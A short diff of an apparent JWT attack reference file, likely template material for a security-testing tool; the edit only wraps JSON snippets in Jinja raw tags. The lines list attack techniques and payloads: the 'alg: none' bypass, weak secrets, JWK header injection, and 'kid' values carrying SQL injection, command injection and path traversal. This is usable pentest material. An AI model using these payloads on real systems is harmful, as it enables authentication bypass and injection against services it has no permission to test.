@@ -5,8 +5,8 @@
 
 <jwt_structure>
 header.payload.signature
-- Header: {"alg":"HS256","typ":"JWT"}
-- Payload: {"sub":"1234","name":"John","iat":1516239022}
+- Header: {% raw %}{"alg":"HS256","typ":"JWT"}{% endraw %}
+- Payload: {% raw %}{"sub":"1234","name":"John","iat":1516239022}{% endraw %}
 - Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
 </jwt_structure>
 
@@ -19,7 +19,7 @@ RS256 to HS256:
 </algorithm_confusion>
 
 <none_algorithm>
-- Set "alg": "none" in header
+- Set {% raw %}"alg": "none"{% endraw %} in header
 - Remove signature completely (keep the trailing dot)
 </none_algorithm>
 
@@ -28,16 +28,16 @@ Common secrets: 'secret', 'password', '123456', 'key', 'jwt_secret', 'your-256-b
 </weak_secrets>
 
 <kid_manipulation>
-- SQL Injection: "kid": "key' UNION SELECT 'secret'--"
-- Command injection: "kid": "|sleep 10"
-- Path traversal: "kid": "../../../../../../dev/null"
+- SQL Injection: {% raw %}"kid": "key' UNION SELECT 'secret'--"{% endraw %}
+- Command injection: {% raw %}"kid": "|sleep 10"{% endraw %}
+- Path traversal: {% raw %}"kid": "../../../../../../dev/null"{% endraw %}
 </kid_manipulation>
 </common_attacks>
 
 <advanced_techniques>
 <jwk_injection>
 Embed public key in token header:
-{"jwk": {"kty": "RSA", "n": "your-public-key-n", "e": "AQAB"}}
+{% raw %}{"jwk": {"kty": "RSA", "n": "your-public-key-n", "e": "AQAB"}}{% endraw %}
 </jwk_injection>
 
 <jku_manipulation>
